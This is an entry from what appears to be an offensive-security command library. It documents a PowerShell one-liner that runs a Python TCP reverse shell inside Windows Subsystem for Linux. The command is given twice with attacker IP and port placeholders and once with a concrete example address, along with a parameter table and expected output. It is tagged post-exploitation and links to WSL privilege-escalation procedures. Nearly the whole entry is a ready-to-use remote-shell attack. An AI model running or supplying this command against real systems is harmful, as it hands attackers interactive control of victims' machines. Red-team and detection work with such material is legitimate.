---
id: e28be453-f5f6-4cfa-929c-7c999d2e5a56
name: execute-wsl-python-reverse-shell
type: command
executor: powershell
data: >-
  wsl python3 -c "import
  socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$ATTACKER_IP',$ATTACKER_PORT));os.dup2(s.fileno(),0);
  os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])")
output: null
created_at: '2023-04-06T03:56:29.607761+00:00'
updated_at: '2023-04-10T20:37:54.958414+00:00'
platforms:
  - Windows
tags:
  - wsl
  - reverse-shell
  - post-exploitation
verified: true
validated: true
---

# execute-wsl-python-reverse-shell

## Command

```powershell
wsl python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$ATTACKER_IP',$ATTACKER_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])")
```

## Description

Executes a Python TCP reverse shell within WSL, connecting back to an attacker listener for remote command execution with root privileges.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| wsl | Invokes WSL | Yes |
| python3 | Python interpreter | Yes |
| -c | Executes inline code | Yes |
| $ATTACKER_IP | Attacker's IP address | Yes |
| $ATTACKER_PORT | Listening port on attacker | Yes |

## Examples

### Basic Usage

```powershell
wsl python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.1.100',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])")
```

## Expected Output

No local output; success indicated by incoming connection on attacker listener.

## Related

- [[procedures/WSL-Privilege-Escalation-via-Default-User-Modification]]
- [[codes/python-tcp-reverse-shell]]
